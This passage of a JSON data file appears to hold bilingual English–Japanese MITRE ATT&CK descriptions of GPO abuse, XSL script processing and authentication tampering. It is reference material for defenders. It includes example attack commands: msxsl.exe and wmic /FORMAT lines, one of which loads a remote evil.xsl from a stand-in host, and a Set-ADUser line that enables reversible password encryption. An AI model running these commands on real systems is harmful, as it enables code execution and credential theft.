                        "description_eng": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)",
                        "description_jp": "攻撃者は、ドメインの意図した任意アクセス制御を破壊するためにグループポリシーオブジェクト（GPO）を変更する可能性があり、通常はドメイン上の権限を昇格させることを目的としています。グループポリシーは、Active Directory（AD）内のユーザーとコンピューターの設定を一元管理できるようにします。GPOは、予測可能なネットワークパス`\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`内に保存されているファイルで構成されるグループポリシー設定のコンテナーです。(引用: TechNet Group Policy Basics)(引用: ADSecurity GPO Persistence 2016)\n\nAD内の他のオブジェクトと同様に、GPOにはアクセス制御が関連付けられています。デフォルトでは、ドメイン内のすべてのユーザーアカウントがGPOの読み取り権限を持っています。GPOアクセス制御権限（書き込みアクセスなど）をドメイン内の特定のユーザーまたはグループに委任することが可能です。\n\n悪意のあるGPOの変更は、[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)、[ツールの無効化または変更](https://attack.mitre.org/techniques/T1562/001)、[イングレスツール転送](https://attack.mitre.org/techniques/T1105)、[アカウントの作成](https://attack.mitre.org/techniques/T1136)、[サービス実行](https://attack.mitre.org/techniques/T1569/002)など、他の多くの悪意のある動作を実装するために使用できます。(引用: ADSecurity GPO Persistence 2016)(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions)(引用: Mandiant M Trends 2016)(引用: Microsoft Hacking Team Breach) GPOはAD環境内の非常に多くのユーザーとマシンの設定を制御できるため、このGPOの悪用から生じる可能性のある潜在的な攻撃は多数あります。(引用: Wald0 Guide to GPOs)\n\n例えば、<code>New-GPOImmediateTask</code>などの一般に入手可能なスクリプトを利用して、GPO設定を変更することにより、悪意のある[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)の作成を自動化できます。この場合、<code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>を変更します。(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions) 場合によっては、攻撃者は、<code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>で設定されているSeEnableDelegationPrivilegeなどの特定のユーザー権限を変更して、攻撃者の制御下にあるユーザーアカウントがGPOを変更できるようになるため、ドメインを完全に制御できる巧妙なADバックドアを実現する可能性があります。(引用: Harmj0y SeEnableDelegationPrivilege Right)"
                    }
                ]
            },
            {
                "id": "T1220",
                "name_eng": "XSL Script Processing",
                "name_jp": "XSLスクリプト処理",
                "description_eng": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>",
                "description_jp": "攻撃者は、XSLファイル内にスクリプトを埋め込むことにより、アプリケーション制御をバイパスし、コードの実行を難読化する可能性があります。拡張スタイルシート言語（XSL）ファイルは、XMLファイル内のデータの処理とレンダリングを記述するためによく使用されます。複雑な操作をサポートするために、XSL標準にはさまざまな言語での埋め込みスクリプトのサポートが含まれています。(引用: Microsoft XSLT Script Mar 2017)\n\n敵対者は、アプリケーション制御をバイパスしながら任意のファイルを実行するためにこの機能を悪用する可能性があります。[信頼できる開発者ユーティリティ プロキシ実行](https://attack.mitre.org/techniques/T1127)と同様に、Microsoft共通線形変換ユーティリティバイナリ (msxsl.exe) (引用: Microsoft msxsl.exe) をインストールして使用し、ローカルまたはリモート (URL参照) XSLファイルに埋め込まれた悪意のあるJavaScriptを実行することができます。(引用: Penetration Testing Lab MSXSL July 2017) msxsl.exeはデフォルトではインストールされないため、敵対者はドロップされたファイルと共にパッケージ化する必要があるでしょう。(引用: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exeは、XMLソースファイルとXSLスタイルシートの2つの主要な引数を取ります。XSLファイルは有効なXMLであるため、敵対者は同じXSLファイルを2回呼び出すかもしれません。msxsl.exeを使用する場合、敵対者はXML/XSLファイルに任意のファイル拡張子を付けることもできます。(引用: XSL Bypass Mar 2019)\n\nコマンドラインの例：(引用: Penetration Testing Lab MSXSL July 2017)(引用: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\n「Squiblytwo」と呼ばれるこのテクニックの別のバリエーションでは、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)を使用してXSLファイル内のJScriptまたはVBScriptを呼び出します。(引用: LOLBAS Wmic) このテクニックは、ローカル/リモートスクリプトも実行でき、[Regsvr32](https://attack.mitre.org/techniques/T1218/010)/「Squiblydoo」の対応物と同様に、信頼できる組み込みのWindowsツールを活用します。敵対者は、/FORMATスイッチを利用する限り、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)で提供されるエイリアスを悪用する可能性があります。(引用: XSL Bypass Mar 2019)\n\nコマンドラインの例：(引用: XSL Bypass Mar 2019)(引用: LOLBAS Wmic)\n\n* ローカルファイル：<code>wmic process list /FORMAT:evil[.]xsl</code>\n* リモートファイル：<code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>",
                "subtechniques": []
            },
            {
                "id": "T1556",
                "name_eng": "Modify Authentication Process",
                "name_jp": "認証プロセスの変更",
                "description_eng": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
                "description_jp": "攻撃者は、ユーザー資格情報へのアクセスや、他の方法では保証されないアカウントへのアクセスを可能にするために、認証メカニズムとプロセスを変更する可能性があります。認証プロセスは、Windowsのローカルセキュリティ認証サーバー（LSASS）プロセスとセキュリティアカウントマネージャー（SAM）、Unixベースシステムのプラグ可能な認証モジュール（PAM）、MacOSシステムの認証プラグインなどのメカニズムによって処理され、資格情報の収集、保存、検証を担当します。認証プロセスを変更することにより、攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用せずにサービスまたはシステムに認証できる可能性があります。\n\n攻撃者は、資格情報を明らかにしたり認証メカニズムをバイパスしたりするために、このプロセスの一部を悪意を持って変更する可能性があります。侵害された資格情報またはアクセスは、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。",
                "subtechniques": [
                    {
                        "id": "T1556.004",
                        "name_eng": "Network Device Authentication",
                        "name_jp": "ネットワークデバイス認証",
                        "description_eng": "Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\n[Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)",
                        "description_jp": "攻撃者は[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)を使用してオペレーティングシステムにパスワードをハードコードし、ネットワークデバイス上のローカルアカウントのネイティブ認証メカニズムをバイパスする可能性があります。\n\n[システムイメージの変更](https://attack.mitre.org/techniques/T1601)には、特定のパスワードを使用して攻撃者にアクセスを提供するために、ネットワークデバイスのオペレーティングシステムに埋め込まれたコードが含まれる場合があります。変更には、パッチを介してオペレーティングシステムイメージに埋め込まれる特定のパスワードが含まれます。認証試行時に、挿入されたコードはまずユーザー入力がパスワードであるかどうかを確認します。そうであれば、アクセスが許可されます。それ以外の場合、埋め込まれたコードは、潜在的に有効な資格情報の検証のために資格情報を渡します。(引用: Mandiant - Synful Knock)"
                    },
                    {
                        "id": "T1556.001",
                        "name_eng": "Domain Controller Authentication",
                        "name_jp": "ドメインコントローラー認証",
                        "description_eng": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \n\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)",
                        "description_jp": "攻撃者はドメインコントローラーの認証プロセスにパッチを適用して、通常の認証メカニズムをバイパスし、アカウントへのアクセスを可能にする可能性があります。\n\nマルウェアは、ユーザーのアカウントや資格情報（例：[スケルトンキー](https://attack.mitre.org/software/S0007)）へのアクセスに使用されるバックドアを作成する目的で、ドメインコントローラーの認証プロセスに偽の資格情報を注入するために使用される場合があります。スケルトンキーは、エンタープライズドメインコントローラー認証プロセス（LSASS）へのパッチを介して機能し、攻撃者が標準の認証システムをバイパスするために使用できる資格情報を含みます。パッチが適用されると、攻撃者は注入されたパスワードを使用して、任意のドメインユーザーアカウントとして正常に認証できます（ドメインコントローラーの再起動によってスケルトンキーがメモリから消去されるまで）。認証されたアクセスにより、単一要素認証環境内のホストやリソースへの無制限のアクセスが可能になる場合があります。(引用: Dell Skeleton)"
                    },
                    {
                        "id": "T1556.009",
                        "name_eng": "Conditional Access Policies",
                        "name_jp": "条件付きアクセスポリシー",
                        "description_eng": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                        "description_jp": "攻撃者は、侵害されたアカウントへの永続的なアクセスを可能にするために、条件付きアクセスポリシーを無効化または変更する可能性があります。条件付きアクセスポリシーは、IDプロバイダーおよびIDおよびアクセス管理システムが、ユーザーにリソースへのアクセスを許可するかどうかを判断するために使用する追加の検証です。\n\n例えば、Entra ID、Okta、JumpCloudでは、ユーザーはIPアドレス、デバイス登録状況、多要素認証の使用状況に基づいてアプリケーションへのアクセスを拒否される可能性があります。(引用: Microsoft Conditional Access)(引用: JumpCloud Conditional Access Policies)(引用: Okta Conditional Access Policies) 場合によっては、IDプロバイダーはさまざまなインジケーターに基づいてサインインを拒否するためにリスクベースのメトリックの使用をサポートすることもあります。AWSおよびGCPでは、IAMポリシーに、送信元IP、リクエストが行われた日付、要求されているリソースまたはリージョンの性質などの任意の制約を検証する`condition`属性を含めることができます。(引用: AWS IAM Conditions)(引用: GCP IAM Conditions) これらの措置は、侵害された資格情報がデータやリソースへの不正アクセスにつながるのを防ぐのに役立ち、また、ユーザー権限を必要なものだけに制限するのにも役立ちます。\n\n信頼できるIP範囲を追加したり、[多要素認証](https://attack.mitre.org/techniques/T1556/006)要件を削除したり、追加の[未使用/未サポートのクラウドリージョン](https://attack.mitre.org/techniques/T1535)を許可したりするなど、条件付きアクセスポリシーを変更することにより、攻撃者はアカウントへの永続的なアクセスを確保し、防御策を回避できる可能性があります。"
                    },
                    {
                        "id": "T1556.008",
                        "name_eng": "Network Provider DLL",
                        "name_jp": "ネットワークプロバイダーDLL",
                        "description_eng": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.(Citation: Network Provider API) During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.(Citation: NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) \n\nAdversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.(Citation: NPLogonNotify)\n\nAdversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.(Citation: NPPSPY - Huntress)",
                        "description_jp": "攻撃者は、認証プロセス中に平文のユーザー資格情報をキャプチャするために、悪意のあるネットワークプロバイダーダイナミックリンクライブラリ（DLL）を登録する可能性があります。ネットワークプロバイダーDLLにより、Windowsは特定のネットワークプロトコルと連携でき、アドオンの資格情報管理機能もサポートできます。(引用: Network Provider API) ログオンプロセス中、Winlogon（対話型ログオンモジュール）はRPCを介してローカルの`mpnotify.exe`プロセスに資格情報を送信します。その後、`mpnotify.exe`プロセスは、ログオンイベントが発生していることを通知する際に、登録済みの資格情報マネージャーと平文で資格情報を共有します。(引用: NPPSPY - Huntress)(引用: NPPSPY Video)(引用: NPLogonNotify)\n\n敵対者は、`mpnotify.exe`から資格情報を受信するように悪意のあるネットワークプロバイダーDLLを設定することができる（引用：NPPSPY）。クレデンシャルマネージャーとして（レジストリを介して）インストールされると、悪意のあるDLLは、ユーザーが`NPLogonNotify()`関数を介してWindowsワークステーションまたはドメインにログオンするたびに、クレデンシャルを受信して保存することができる（引用：NPLogonNotify）。\n\n敵対者は、サーバーやドメインコントローラーなど、ログオンアクティビティの増加や管理者ログオンアクティビティが確認されているシステムに、悪意のあるネットワークプロバイダーDLLを仕掛けることを標的とする可能性がある(引用：NPPSPY - Huntress)。"
                    },
                    {
                        "id": "T1556.002",
                        "name_eng": "Password Filter DLL",
                        "name_jp": "パスワードフィルターDLL",
                        "description_eng": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)",
                        "description_jp": "攻撃者は、検証される際にユーザー資格情報を取得するために、認証プロセスに悪意のあるパスワードフィルターダイナミックリンクライブラリ（DLL）を登録する可能性があります。\n\nWindowsパスワードフィルターは、ドメインアカウントとローカルアカウントの両方のパスワードポリシー施行メカニズムです。フィルターは、潜在的なパスワードをパスワードポリシーに対して検証するメソッドを含むDLLとして実装されます。フィルターDLLは、ローカルアカウントの場合はローカルコンピューターに、ドメインアカウントの場合はドメインコントローラーに配置できます。セキュリティアカウントマネージャー（SAM）に新しいパスワードを登録する前に、ローカルセキュリティ機関（LSA）は登録されている各フィルターに検証を要求します。登録されているすべてのフィルターが検証を承認するまで、潜在的な変更は有効になりません。\n\n敵対者は悪意のあるパスワードフィルターを登録して、ローカルコンピューターやドメイン全体から認証情報を収集することができます。適切な検証を実行するには、フィルターはLSAから平文の認証情報を受信する必要があります。悪意のあるパスワードフィルターは、パスワード要求が行われるたびにこれらの平文の認証情報を受信します。(引用：Carnal Ownage Password Filters Sept 2013)"
                    },
                    {
                        "id": "T1556.006",
                        "name_eng": "Multi-Factor Authentication",
                        "name_jp": "多要素認証",
                        "description_eng": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions)\n\nFor example, modifying the Windows hosts file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) \n\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)",
                        "description_jp": "攻撃者は、侵害されたアカウントへの永続的なアクセスを可能にするために、多要素認証（MFA）メカニズムを無効化または変更する可能性があります。\n\nMFAがないアカウントを侵害するか、[多要素認証リクエスト生成](https://attack.mitre.org/techniques/T1621)などのMFAバイパス方法を用いることで攻撃者がネットワークへのアクセス権を取得すると、攻撃者はそのアクセス権を利用してMFA防御を変更または完全に無効にする可能性があります。これは、Azure AD条件付きアクセスポリシーからユーザーを除外したり、脆弱な/攻撃者が制御する新しいMFAメソッドを登録したり、あるいはMFAプログラムや設定ファイルをを手動でパッチして期待される機能をバイパスしたりするなど、正当な機能を悪用することで達成できます。(引用: Mandiant APT42)(引用: Azure AD Conditional Access Exclusions)\n\n例えば、Windowsのhostsファイル（<code>C:\\windows\\system32\\drivers\\etc\\hosts</code>）を変更してMFA呼び出しをMFAサーバーではなくlocalhostにリダイレクトすると、MFAプロセスが失敗する可能性があります。「フェイルオープン」ポリシーが設定されている場合、他の方法で成功した認証試行はMFAを強制せずにアクセスが許可される可能性があります。(引用: Russians Exploit Default MFA Protocol - CISA March 2022)\n\n敵対者の範囲、目標、権限によっては、個々のアカウントまたは被害者のネットワーク環境内のすべてのドメインアカウントなど、より大きなグループに関連付けられたすべてのアカウントに対してMFA防御が無効にされる場合があります。(引用: Russians Exploit Default MFA Protocol - CISA March 2022)"
                    },
                    {
                        "id": "T1556.007",
                        "name_eng": "Hybrid Identity",
                        "name_jp": "ハイブリッドID",
                        "description_eng": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra ID \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.(Citation: Mandiant Azure AD Backdoors)",
                        "description_jp": "攻撃者は、オンプレミスのユーザーIDに関連付けられたクラウド認証プロセスにパッチを適用、変更、またはその他の方法でバックドアを仕掛け、通常の認証メカニズムをバイパスし、資格情報にアクセスし、アカウントへの永続的なアクセスを可能にする可能性があります。\n\n多くの組織は、オンプレミス環境とクラウドベース環境の間で共有されるハイブリッドユーザーおよびデバイスIDを維持しています。これらはいくつかの方法で維持できます。例えば、Microsoft Entra IDには、Active DirectoryとEntra IDの間でIDを同期するための3つのオプションが含まれています(引用：Azure AD Hybrid Identity)：\n\n* パスワードハッシュ同期（PHS）。特権のあるオンプレミスアカウントがActive DirectoryとEntra IDの間でユーザーパスワードハッシュを同期し、Entra IDへの認証を完全にクラウドで行えるようにします。\n* パススルー認証（PTA）。Entra ID認証試行がオンプレミスのPTAエージェントに転送され、エージェントがActive Directoryに対して資格情報を検証します。\n* Active Directoryフェデレーションサービス（AD FS）。Active DirectoryとEntra IDの間に信頼関係が確立されます。\n\nAD FSは、AWSやGCPなどの他のSaaSおよびクラウドプラットフォームでも使用でき、認証プロセスをAD FSに引き渡し、ハイブリッドユーザーのIDと権限を含むトークンを受け取ります。\n\nハイブリッドIDに関連付けられた認証プロセスを変更することにより、攻撃者はクラウドリソースへの永続的な特権アクセスを確立できる可能性があります。例えば、PTAエージェントを実行しているオンプレミスサーバーを侵害した攻撃者は、<code>AzureADConnectAuthenticationAgentService</code>プロセスに悪意のあるDLLを注入して、Entra IDへのすべての認証試行を承認し、ユーザー資格情報も記録する可能性があります。(引用: Azure AD Connect for Read Teamers)(引用: AADInternals Azure AD On-Prem to Cloud) AD FSを使用している環境では、攻撃者は<code>Microsoft.IdentityServer.Servicehost</code>構成ファイルを編集して、多要素認証と定義されたAD FSポリシーをバイパスして、任意のクレームセットを持つ任意のユーザーの認証トークンを生成する悪意のあるDLLをロードする可能性があります。(引用: MagicWeb)\n\n場合によっては、攻撃者はクラウドからハイブリッドID認証プロセスを変更できる可能性があります。例えば、Entra IDテナントのグローバル管理者アカウントを侵害した攻撃者は、Webコンソール経由で新しいPTAエージェントを登録でき、同様に資格情報を収集して任意のユーザーとしてEntra ID環境にログインできるようになる可能性があります。(引用: Mandiant Azure AD Backdoors)"
                    },
                    {
                        "id": "T1556.005",
                        "name_eng": "Reversible Encryption",
                        "name_jp": "可逆暗号化",
                        "description_eng": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.",
